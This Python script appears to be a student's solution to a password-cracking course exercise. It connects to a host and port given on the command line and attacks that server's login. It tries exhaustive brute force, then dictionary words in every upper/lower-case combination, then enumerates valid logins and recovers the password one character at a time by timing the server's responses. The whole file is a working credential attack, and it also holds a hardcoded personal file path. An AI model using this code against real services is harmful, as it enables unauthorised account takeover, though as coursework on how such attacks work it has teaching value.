# write your code here
import socket
import argparse
import itertools
import string
import json
import datetime
import time


class Hack:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = (host, port)

    @property
    def connection(self):
        return self.host, self.port

    @connection.setter
    def connection(self, value):
        self._connection = value

    def send_message(self, host, send_msg):
        host.send(send_msg.encode())
        response = host.recv(1024)
        return response.decode()

    @staticmethod
    def psw_generator():
        numbers_letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
        for i in range(1000000):
            for message in itertools.product(numbers_letters, repeat=i + 1):
                yield "".join(message)

    def brute_password_break(self):
        password = self.psw_generator()
        cnt = 0
        with socket.socket() as s:
            s.connect(self._connection)
            while cnt < 100000:
                message = next(password)
                response = self.send_message(s, message)
                if response == "Connection success!":
                    print(message)
                    return True
                cnt += 1
            print("Too many attempts")

    def dict_password_break(self):
        file = input()
        with socket.socket() as s:
            s.connect(self._connection)
            with open(file) as f:
                for line in f:
                    c = map(lambda x: ''.join(x), itertools.product(*([letter.strip().lower(), letter.strip().upper()] for letter in line)))
                    for password in list(c):
                        response = self.send_message(s, password)
                        if response == "Connection success!":
                            print(password)
                            return True
        print("Too many attempts")
        return False

    def json_password_break(self):
        file = "/Users/konstantinoslalaounis/Desktop/Python/Password Hacker/Password Hacker/task/logins.txt"
        login = None
        passwords = self.psw_generator()
        password = ''
        cnt = 0
        with socket.socket() as s:
            s.connect(self._connection)
            with open(file) as f:
                for line in f:
                    message = {"login": line.strip(), "password": ' '}
                    response = self.send_message(s, json.dumps(message))
                    to_str = json.loads(response)
                    if to_str["result"] == "Wrong password!":
                        login = line.strip()
                        break
            while cnt < 100000:
                start = time.perf_counter()
                pas_to_try = next(passwords)
                message = {"login": login, "password": password + pas_to_try}
                response = self.send_message(s, json.dumps(message))
                to_str = json.loads(response)
                finish = time.perf_counter() - start
                if to_str["result"] == "Wrong password!" and finish >= 0.1:
                    password += pas_to_try
                    passwords = self.psw_generator()
                if to_str["result"] == "Connection success!":
                    print(json.dumps(message))
                    return True
                cnt += 1
        print("Too many attempts")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", type=str, help="Add a host to connect to")
    parser.add_argument("port", type=int, help="Add a port")
    args = parser.parse_args()
    if not args.host or not args.port:
        print("Not valid arguments")
        quit()
    server = Hack(args.host, args.port)
    server.json_password_break()
